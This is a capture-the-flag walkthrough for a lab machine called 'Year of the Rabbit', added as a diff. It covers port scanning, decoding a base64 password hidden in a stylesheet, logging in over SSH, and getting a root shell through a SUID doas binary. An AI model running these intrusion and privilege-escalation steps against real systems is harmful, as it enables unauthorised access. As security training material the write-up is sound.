@@ -1,0 +1,45 @@
+----------------                               ------------------
+               :::::::::::;| YEAR OF THE RABBIT |;::::::::::::
+
+
+1) DEPLOY THE MACHINE AND GET READY.
+
+TASK - 1 (RECON)
+
+1. Initial scan:
+nmap -Pn <ip> -vv
+"Only port 22/SSH and 80/HTTP open"
+
+2. Website investigation:
+http://<ip> shows rabbit theme
+"Hidden directory found: /assets/"
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. Check /assets directory:
+"style.css contains base64 string"
+echo "cGFzc3dvcmQ6IHJhYmJpdHMyMDIx" | base64 -d
+"Decodes to: password: rabbits2021"
+
+2. SSH access attempt:
+ssh bunny@<ip>
+"Password works! User shell obtained"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (PRIV ESC)
+
+1. Find SUID binaries:
+find / -perm -4000 2>/dev/null
+"/usr/bin/doas has SUID bit set"
+"doas is like sudo - known vulnerabilities"
+
+2. Exploit doas:
+doas -u root /bin/sh
+"Root shell achieved!"
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- RABBIT YEAR OWNED ----------
